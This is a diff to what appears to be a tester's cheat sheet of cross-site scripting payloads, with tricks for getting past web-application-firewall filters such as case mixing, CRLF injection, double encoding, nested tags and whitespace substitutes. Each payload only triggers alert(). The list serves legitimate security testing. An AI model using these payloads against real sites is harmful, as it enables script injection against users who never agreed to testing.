@@ -1,2 +1,28 @@
-angularjs
+*** angularjs ***
 {{constructor.constructor('alert(1)')()}}
+
+*** img ***
+<img src=x onerror=alert('joy')>
+<img src=x onload=alert('joy')>
+
+*** Check if the firewall is blocking only lowercase: ***
+<sCRipT>alert(1)</sCRiPt>
+
+*** Try to break firewall regex with new line (\r\n), aka. CRLF injection: ***
+<script>%0d%0aalert(1)</script>
+
+*** Try double encoding: ***
+%2522
+
+*** Testing for recursive filters, if firewall removes the text in bold, we will have clear payload:***
+<scr<script>ipt>alert(1);</scr</script>ipt>
+
+*** Injecting anchor tag without whitespaces: ***
+<a/href="j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt:alert&lpar;1&rpar;">
+
+*** Try to bypass whitespaces using a bullet: ***
+<svg•onload=alert(1)>
+
+*** Try to change request method (POST instead of GET): ***
+GET /?q=xss POST /?q=xss
+
